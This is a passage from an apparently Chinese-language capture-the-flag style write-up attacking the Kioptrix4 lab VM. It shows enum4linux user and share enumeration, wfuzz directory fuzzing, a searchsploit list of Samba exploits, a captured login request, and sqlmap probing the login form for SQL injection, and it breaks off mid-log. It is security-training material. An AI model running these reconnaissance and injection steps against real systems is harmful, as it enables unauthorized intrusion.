class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody	Name: nobody	Desc: <span class="token punctuation">(</span>null<span class="token punctuation">)</span>
index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert	Name: ,,,	Desc: <span class="token punctuation">(</span>null<span class="token punctuation">)</span>
index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root	Name: root	Desc: <span class="token punctuation">(</span>null<span class="token punctuation">)</span>
index: 0x4 RID: 0xbba acb: 0x00000010 Account: john	Name: ,,,	Desc: <span class="token punctuation">(</span>null<span class="token punctuation">)</span>
index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret	Name: loneferret,,,	Desc: <span class="token punctuation">(</span>null<span class="token punctuation">)</span>

user:<span class="token punctuation">[</span>nobody<span class="token punctuation">]</span> rid:<span class="token punctuation">[</span>0x1f5<span class="token punctuation">]</span>
user:<span class="token punctuation">[</span>robert<span class="token punctuation">]</span> rid:<span class="token punctuation">[</span>0xbbc<span class="token punctuation">]</span>
user:<span class="token punctuation">[</span>root<span class="token punctuation">]</span> rid:<span class="token punctuation">[</span>0x3e8<span class="token punctuation">]</span>
user:<span class="token punctuation">[</span>john<span class="token punctuation">]</span> rid:<span class="token punctuation">[</span>0xbba<span class="token punctuation">]</span>
user:<span class="token punctuation">[</span>loneferret<span class="token punctuation">]</span> rid:<span class="token punctuation">[</span>0xbb8<span class="token punctuation">]</span>

 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token punctuation">(</span> Share Enumeration on <span class="token number">192.168</span>.1.6 <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>


	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service <span class="token punctuation">(</span>Kioptrix4 server <span class="token punctuation">(</span>Samba, Ubuntu<span class="token punctuation">))</span>
Reconnecting with SMB1 <span class="token keyword">for</span> workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            KIOPTRIX4

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Attempting to map shares on <span class="token number">192.168</span>.1.6

//192.168.1.6/print$	Mapping: DENIED Listing: N/A Writing: N/A

<span class="token punctuation">[</span>E<span class="token punctuation">]</span> Can<span class="token string">'t understand response:

NT_STATUS_NETWORK_ACCESS_DENIED listing \*
//192.168.1.6/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for 192.168.1.6 )============================



[+] Attaching to 192.168.1.6 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] KIOPTRIX4
	[+] Builtin

[+] Password Info for Domain: KIOPTRIX4

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: Not Set
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 0


 =======================================( Groups on 192.168.1.6 )=======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ===================( Users on 192.168.1.6 via RID cycling (RIDS: 500-550,1000-1050) )===================


[I] Found new SID: 
S-1-5-21-2529228035-991147148-3991031631

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-22-1 and logon username '</span>', password <span class="token string">''</span>

S-1-22-1-1000 Unix User<span class="token punctuation">\</span>loneferret <span class="token punctuation">(</span>Local User<span class="token punctuation">)</span>
S-1-22-1-1001 Unix User<span class="token punctuation">\</span>john <span class="token punctuation">(</span>Local User<span class="token punctuation">)</span>
S-1-22-1-1002 Unix User<span class="token punctuation">\</span>robert <span class="token punctuation">(</span>Local User<span class="token punctuation">)</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating <span class="token function">users</span> using SID S-1-5-32 and logon username <span class="token string">''</span>, password <span class="token string">''</span>

S-1-5-32-544 BUILTIN<span class="token punctuation">\</span>Administrators <span class="token punctuation">(</span>Local Group<span class="token punctuation">)</span>
S-1-5-32-545 BUILTIN<span class="token punctuation">\</span>Users <span class="token punctuation">(</span>Local Group<span class="token punctuation">)</span>
S-1-5-32-546 BUILTIN<span class="token punctuation">\</span>Guests <span class="token punctuation">(</span>Local Group<span class="token punctuation">)</span>
S-1-5-32-547 BUILTIN<span class="token punctuation">\</span>Power Users <span class="token punctuation">(</span>Local Group<span class="token punctuation">)</span>
S-1-5-32-548 BUILTIN<span class="token punctuation">\</span>Account Operators <span class="token punctuation">(</span>Local Group<span class="token punctuation">)</span>
S-1-5-32-549 BUILTIN<span class="token punctuation">\</span>Server Operators <span class="token punctuation">(</span>Local Group<span class="token punctuation">)</span>
S-1-5-32-550 BUILTIN<span class="token punctuation">\</span>Print Operators <span class="token punctuation">(</span>Local Group<span class="token punctuation">)</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating <span class="token function">users</span> using SID S-1-5-21-2529228035-991147148-3991031631 and logon username <span class="token string">''</span>, password <span class="token string">''</span>

S-1-5-21-2529228035-991147148-3991031631-501 KIOPTRIX4<span class="token punctuation">\</span>nobody <span class="token punctuation">(</span>Local User<span class="token punctuation">)</span>
S-1-5-21-2529228035-991147148-3991031631-513 KIOPTRIX4<span class="token punctuation">\</span>None <span class="token punctuation">(</span>Domain Group<span class="token punctuation">)</span>
S-1-5-21-2529228035-991147148-3991031631-1000 KIOPTRIX4<span class="token punctuation">\</span>root <span class="token punctuation">(</span>Local User<span class="token punctuation">)</span>

 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token punctuation">(</span> Getting printer info <span class="token keyword">for</span> <span class="token number">192.168</span>.1.6 <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

No printers returned.


enum4linux complete on Wed Jun <span class="token number">12</span> 08:56:26 <span class="token number">2024</span>

</code></pre> 
<h4><a id="255_wfuzz_750"></a>2.5.5 wfuzz模糊测试</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://192.168.1.6/FUZZ</span>
********************************************************
* Wfuzz <span class="token number">3.1</span>.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.6/FUZZ
Total requests: <span class="token number">3024</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

000001629:   <span class="token number">302</span>        <span class="token number">0</span> L      <span class="token number">0</span> W        <span class="token number">0</span> Ch        <span class="token string">"logout"</span>                                                                                                                                       
000001736:   <span class="token number">302</span>        <span class="token number">1</span> L      <span class="token number">22</span> W       <span class="token number">220</span> Ch      <span class="token string">"member"</span>                                                                                                                                       
000002294:   <span class="token number">301</span>        <span class="token number">9</span> L      <span class="token number">31</span> W       <span class="token number">350</span> Ch      <span class="token string">"robert"</span>                                                                                                                                       
000001458:   <span class="token number">301</span>        <span class="token number">9</span> L      <span class="token number">31</span> W       <span class="token number">348</span> Ch      <span class="token string">"john"</span>                                                                                                                                         
000001350:   <span class="token number">200</span>        <span class="token number">45</span> L     <span class="token number">94</span> W       <span class="token number">1255</span> Ch     <span class="token string">"index"</span>                                                                                                                                        
000001337:   <span class="token number">301</span>        <span class="token number">9</span> L      <span class="token number">31</span> W       <span class="token number">350</span> Ch      <span class="token string">"images"</span>                                                                                                                                       
000000566:   <span class="token number">403</span>        <span class="token number">10</span> L     <span class="token number">33</span> W       <span class="token number">326</span> Ch      <span class="token string">"cgi-bin/"</span>                                                                                                                                     

Total time: <span class="token number">5.687175</span>
Processed Requests: <span class="token number">3024</span>
Filtered Requests: <span class="token number">3017</span>
Requests/sec.: <span class="token number">531.7226</span>

</code></pre> 
<h4><a id="256_searchsploitsamba_780"></a>2.5.6 searchsploit搜索samba漏洞</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># searchsploit samba 3.        </span>
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       <span class="token operator">|</span>  Path
------------------------------------------------------------------------------------- ---------------------------------
Samba <span class="token number">2.2</span>.0 <span class="token operator">&lt;</span> <span class="token number">2.2</span>.8 <span class="token punctuation">(</span>OSX<span class="token punctuation">)</span> - trans2open Overflow <span class="token punctuation">(</span>Metasploit<span class="token punctuation">)</span>                         <span class="token operator">|</span> osx/remote/9924.rb
Samba <span class="token number">2.2</span>.x - <span class="token string">'call_trans2open'</span> Remote Buffer Overflow <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                           <span class="token operator">|</span> unix/remote/22468.c
Samba <span class="token number">3.0</span>.10 <span class="token punctuation">(</span>OSX<span class="token punctuation">)</span> - <span class="token string">'lsa_io_trans_names'</span> Heap Overflow <span class="token punctuation">(</span>Metasploit<span class="token punctuation">)</span>                 <span class="token operator">|</span> osx/remote/16875.rb
Samba <span class="token number">3.0</span>.10 <span class="token operator">&lt;</span> <span class="token number">3.3</span>.5 - Format String / Security Bypass                               <span class="token operator">|</span> multiple/remote/10095.txt
Samba <span class="token number">3.0</span>.20 <span class="token operator">&lt;</span> <span class="token number">3.0</span>.25rc3 - <span class="token string">'Username'</span> map script<span class="token string">' Command Execution (Metasploit)     | unix/remote/16320.rb
Samba 3.0.21 &lt; 3.0.24 - LSA trans names Heap Overflow (Metasploit)                   | linux/remote/9950.rb
Samba 3.0.24 (Linux) - '</span>lsa_io_trans_names<span class="token string">' Heap Overflow (Metasploit)               | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - '</span>lsa_io_trans_names<span class="token string">' Heap Overflow (Metasploit)             | solaris/remote/16329.rb
Samba 3.0.27a - '</span>send_mailslot<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">' Remote Buffer Overflow                             | linux/dos/4732.c
Samba 3.0.29 (Client) - '</span>receive_smb_raw<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">' Buffer Overflow (PoC)                    | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                     | linux/remote/364.pl
Samba 3.3.12 (Linux x86) - '</span>chain_reply<span class="token string">' Memory Corruption (Metasploit)              | linux_x86/remote/16860.rb
Samba 3.3.5 - Format String / Security Bypass                                        | linux/remote/33053.txt
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow (Meta | linux/remote/21850.rb
Samba 3.4.5 - Symlink Directory Traversal                                            | linux/remote/33599.txt
Samba 3.4.5 - Symlink Directory Traversal (Metasploit)                               | linux/remote/33598.rb
Samba 3.4.7/3.5.1 - Denial of Service                                                | linux/dos/12588.txt
Samba 3.5.0 - Remote Code Execution                                                  | linux/remote/42060.py
Samba 3.5.0 &lt; 4.4.14/4.5.10/4.6.4 - '</span>is_known_pipename<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">' Arbitrary Module Load (Met | linux/remote/42084.rb
Samba 3.5.11/3.6.3 - Remote Code Execution                                           | linux/remote/37834.py
Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                           | linux/dos/27778.txt
Samba &lt; 3.0.20 - Remote Heap Overflow                                                | linux/remote/7701.txt
Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                        | linux_x86/dos/36741.py
Sambar Server 4.3/4.4 Beta 3 - Search CGI                                            | windows/remote/20223.txt
Sambar Server 6.1 Beta 2 - '</span>showini.asp' Arbitrary File Access                       <span class="token operator">|</span> windows/remote/24163.txt
------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

</code></pre> 
<hr> 
<h2><a id="_820"></a>三、渗透测试</h2> 
<h3><a id="31_SQL_822"></a>3.1 SQL注入</h3> 
<h4><a id="311_Burp_Suit_823"></a>3.1.1 Burp Suit抓登录包</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/dev_run_app/vulhub/kl_4<span class="token punctuation">]</span>
└─<span class="token comment"># vim sql.txt  </span>
                                                                                                                                                                                                                
┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/dev_run_app/vulhub/kl_4<span class="token punctuation">]</span>
└─<span class="token comment"># cat sql.txt  </span>
POST /checklogin.php HTTP/1.1
Host: <span class="token number">192.168</span>.1.6
Content-Length: <span class="token number">47</span>
Cache-Control: max-age<span class="token operator">=</span><span class="token number">0</span>
Upgrade-Insecure-Requests: <span class="token number">1</span>
Origin: http://192.168.1.6
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/117.0.5938.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>
Referer: http://192.168.1.6/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>
Connection: close

<span class="token assign-left variable">myusername</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">mypassword</span><span class="token operator">=</span><span class="token number">123456</span><span class="token operator">&amp;</span><span class="token assign-left variable">Submit</span><span class="token operator">=</span>Login

</code></pre> 
<h4><a id="312__848"></a>3.1.2 爆破数据库</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/dev_run_app/vulhub/kl_4<span class="token punctuation">]</span>
└─<span class="token comment"># sqlmap -r sql.txt --batch --level 3 --dbs</span>
        ___
       __H__
 ___ ___<span class="token punctuation">[</span><span class="token string">']_____ ___ ___  {1.8.3#stable}
|_ -| . [)]     | .'</span><span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span>
<span class="token operator">|</span>___<span class="token operator">|</span>_  <span class="token punctuation">[</span>.<span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>
      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:35:59 /2024-06-12/

[09:35:59] [INFO] parsing HTTP request from '</span>sql.txt<span class="token string">'
[09:36:00] [INFO] testing connection to the target URL
[09:36:00] [INFO] testing if the target URL content is stable
[09:36:00] [INFO] target URL content is stable
[09:36:00] [INFO] testing if POST parameter '</span>myusername<span class="token string">' is dynamic
[09:36:00] [WARNING] POST parameter '</span>myusername<span class="token string">' does not appear to be dynamic
[09:36:00] [WARNING] heuristic (basic) test shows that POST parameter '</span>myusername<span class="token string">' might not be injectable
[09:36:00] [INFO] testing for SQL injection on POST parameter '</span>myusername<span class="token string">'
[09:36:00] [INFO] testing '</span>AND boolean-based blind - WHERE or HAVING clause<span class="token string">'
[09:36:01] [INFO] testing '</span>AND boolean-based blind - WHERE or HAVING clause <span class="token punctuation">(</span>subquery - comment<span class="token punctuation">)</span><span class="token string">'
[09:36:01] [INFO] testing '</span>AND boolean-based blind - WHERE or HAVING clause <span class="token punctuation">(</span>comment<span class="token punctuation">)</span><span class="token string">'
[09:36:01] [INFO] testing '</span>AND boolean-based blind - WHERE or HAVING clause <span class="token punctuation">(</span>MySQL comment<span class="token punctuation">)</span><span class="token string">'
[09:36:01] [INFO] testing '</span>AND boolean-based blind - WHERE or HAVING clause <span class="token punctuation">(</span>Microsoft Access comment<span class="token punctuation">)</span><span class="token string">'
[09:36:01] [INFO] testing '</span>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause<span class="token string">'
[09:36:01] [INFO] testing '</span>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>MAKE_SET<span class="token punctuation">)</span><span class="token string">'
[09:36:01] [INFO] testing '</span>PostgreSQL AND boolean-based blind - WHERE or HAVING clause <span class="token punctuation">(</span>CAST<span class="token punctuation">)</span><span class="token string">'
[09:36:01] [INFO] testing '</span>Oracle AND boolean-based blind - WHERE or HAVING clause <span class="token punctuation">(</span>CTXSYS.DRITHSX.SN<span class="token punctuation">)</span><span class="token string">'
[09:36:02] [INFO] testing '</span>SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause <span class="token punctuation">(</span>JSON<span class="token punctuation">)</span><span class="token string">'
[09:36:02] [INFO] testing '</span>Boolean-based blind - Parameter replace <span class="token punctuation">(</span>original value<span class="token punctuation">)</span><span class="token string">'
[09:36:02] [INFO] testing '</span>PostgreSQL boolean-based blind - Parameter replace<span class="token string">'
[09:36:02] [INFO] testing '</span>Microsoft SQL Server/Sybase boolean-based blind - Parameter replace<span class="token string">'
[09:36:02] [INFO] testing '</span>Oracle boolean-based blind - Parameter replace<span class="token string">'
[09:36:02] [INFO] testing '</span>Informix boolean-based blind - Parameter replace<span class="token string">'
[09:36:02] [INFO] testing '</span>Microsoft Access boolean-based blind - Parameter replace<span class="token string">'
[09:36:02] [INFO] testing '</span>Boolean-based blind - Parameter replace <span class="token punctuation">(</span>DUAL<span class="token punctuation">)</span><span class="token string">'
[09:36:02] [INFO] testing '</span>Boolean-based blind - Parameter replace <span class="token punctuation">(</span>DUAL - original value<span class="token punctuation">)</span><span class="token string">'
[09:36:02] [INFO] testing '</span>Boolean-based blind - Parameter replace <span class="token punctuation">(</span>CASE<span class="token punctuation">)</span><span class="token string">'
[09:36:02] [INFO] testing '</span>Boolean-based blind - Parameter replace <span class="token punctuation">(</span>CASE - original value<span class="token punctuation">)</span><span class="token string">'
[09:36:02] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span> boolean-based blind - ORDER BY, GROUP BY clause<span class="token string">'
[09:36:02] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span> boolean-based blind - ORDER BY, GROUP BY clause <span class="token punctuation">(</span>original value<span class="token punctuation">)</span><span class="token string">'
[09:36:02] [INFO] testing '</span>MySQL <span class="token operator">&lt;</span> <span class="token number">5.0</span> boolean-based blind - ORDER BY, GROUP BY clause<span class="token string">'
[09:36:02] [INFO] testing '</span>PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause<span class="token string">'
[09:36:02] [INFO] testing '</span>Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause<span class="token string">'
[09:36:02] [INFO] testing '</span>Oracle boolean-based blind - ORDER BY, GROUP BY clause<span class="token string">'
[09:36:02] [INFO] testing '</span>HAVING boolean-based blind - WHERE, GROUP BY clause<span class="token string">'
[09:36:02] [INFO] testing '</span>PostgreSQL boolean-based blind - Stacked queries<span class="token string">'
[09:36:02] [INFO] testing '</span>Microsoft SQL Server/Sybase boolean-based blind - Stacked queries <span class="token punctuation">(</span>IF<span class="token punctuation">)</span><span class="token string">'
[09:36:02] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:36:02] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.1</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:36:03] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.1</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>UPDATEXML<span class="token punctuation">)</span><span class="token string">'
[09:36:03] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">4.1</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:36:03] [INFO] testing '</span>PostgreSQL AND error-based - WHERE or HAVING clause<span class="token string">'
[09:36:03] [INFO] testing '</span>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause <span class="token punctuation">(</span>IN<span class="token punctuation">)</span><span class="token string">'
[09:36:03] [INFO] testing '</span>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause <span class="token punctuation">(</span>CONVERT<span class="token punctuation">)</span><span class="token string">'
[09:36:03] [INFO] testing '</span>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause <span class="token punctuation">(</span>CONCAT<span class="token punctuation">)</span><span class="token string">'
[09:36:04] [INFO] testing '</span>Oracle AND error-based - WHERE or HAVING clause <span class="token punctuation">(</span>XMLType<span class="token punctuation">)</span><span class="token string">'
[09:36:04] [INFO] testing '</span>Oracle AND error-based - WHERE or HAVING clause <span class="token punctuation">(</span>UTL_INADDR.GET_HOST_ADDRESS<span class="token punctuation">)</span><span class="token string">'
[09:36:04] [INFO] testing '</span>Oracle AND error-based - WHERE or HAVING clause <span class="token punctuation">(</span>CTXSYS.DRITHSX.SN<span class="token punctuation">)</span><span class="token string">'
[09:36:04] [INFO] testing '</span>Firebird AND error-based - WHERE or HAVING clause<span class="token string">'
[09:36:04] [INFO] testing '</span>MonetDB AND error-based - WHERE or HAVING clause<span class="token string">'
[09:36:05] [INFO] testing '</span>Vertica AND error-based - WHERE or HAVING clause<span class="token string">'
[09:36:05] [INFO] testing '</span>IBM DB2 AND error-based - WHERE or HAVING clause<span class="token string">'
[09:36:05] [INFO] testing '</span>ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause<span class="token string">'
[09:36:05] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.1</span> error-based - PROCEDURE ANALYSE <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:36:05] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span> error-based - Parameter replace <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:36:05] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.1</span> error-based - Parameter replace <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:36:05] [INFO] testing '</span>PostgreSQL error-based - Parameter replace<span class="token string">'
[09:36:05] [INFO] testing '</span>Microsoft SQL Server/Sybase error-based - Parameter replace<span class="token string">'
[09:36:05] [INFO] testing '</span>Oracle error-based - Parameter replace<span class="token string">'
[09:36:05] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.1</span> error-based - ORDER BY, GROUP BY clause <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:36:05] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">4.1</span> error-based - ORDER BY, GROUP BY clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:36:05] [INFO] testing '</span>PostgreSQL error-based - ORDER BY, GROUP BY clause<span class="token string">'
[09:36:05] [INFO] testing '</span>Microsoft SQL Server/Sybase error-based - Stacking <span class="token punctuation">(</span>EXEC<span class="token punctuation">)</span><span class="token string">'
[09:36:05] [INFO] testing '</span>Generic inline queries<span class="token string">'
[09:36:05] [INFO] testing '</span>MySQL inline queries<span class="token string">'
[09:36:05] [INFO] testing '</span>PostgreSQL inline queries<span class="token string">'
[09:36:05] [INFO] testing '</span>Microsoft SQL Server/Sybase inline queries<span class="token string">'
[09:36:05] [INFO] testing '</span>Oracle inline queries<span class="token string">'
[09:36:05] [INFO] testing '</span>SQLite inline queries<span class="token string">'
[09:36:06] [INFO] testing '</span>Firebird inline queries<span class="token string">'
[09:36:06] [INFO] testing '</span>ClickHouse inline queries<span class="token string">'
[09:36:06] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>comment<span class="token punctuation">)</span><span class="token string">'
[09:36:06] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 stacked queries<span class="token string">'
[09:36:06] [INFO] testing '</span>MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>query SLEEP - comment<span class="token punctuation">)</span><span class="token string">'
[09:36:06] [INFO] testing '</span>PostgreSQL <span class="token operator">&gt;</span> <span class="token number">8.1</span> stacked queries <span class="token punctuation">(</span>comment<span class="token punctuation">)</span><span class="token string">'
[09:36:06] [INFO] testing '</span>PostgreSQL <span class="token operator">&lt;</span> <span class="token number">8.2</span> stacked queries <span class="token punctuation">(</span>Glibc - comment<span class="token punctuation">)</span><span class="token string">'
[09:36:06] [INFO] testing '</span>Microsoft SQL Server/Sybase stacked queries <span class="token punctuation">(</span>comment<span class="token punctuation">)</span><span class="token string">'
[09:36:06] [INFO] testing '</span>Microsoft SQL Server/Sybase stacked queries <span class="token punctuation">(</span>DECLARE - comment<span class="token punctuation">)</span><span class="token string">'
